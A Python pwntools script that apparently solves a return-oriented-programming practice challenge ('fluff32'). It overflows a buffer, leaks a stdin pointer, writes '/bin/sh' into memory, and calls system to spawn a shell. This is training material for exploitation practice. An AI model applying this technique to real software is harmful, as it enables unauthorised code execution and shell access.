from pwn import *
from struct import unpack

pop3ret = 0x080486f9
bin_sh_addr = 0x0804a028
system_call = 0x8048430
fgets_call = 0x8048410
puts_call = 0x8048420
stdin = 0x0804a060
main = 0x0804857b

p = process('./fluff32')

exploit = ''
exploit += 'A'*44
exploit += p32(puts_call)
exploit += p32(main)
exploit += p32(stdin)
p.recvuntil('>')
p.sendline(exploit)

p.recv(1024)
stdin_dyn = struct.unpack("I",p.recv(1024)[:4])[0]

exploit = ''
exploit += 'A'*44
exploit += p32(fgets_call)
exploit += p32(main)
exploit += p32(bin_sh_addr)
exploit += p32(0x15)
exploit += p32(stdin_dyn)
p.sendline(exploit)

p.sendline('/bin/sh')

exploit = ''
exploit += 'A'*44
exploit += p32(system_call)
exploit += 'aaaa'
exploit += p32(bin_sh_addr)

p.recvuntil('>')
p.sendline(exploit)
p.interactive()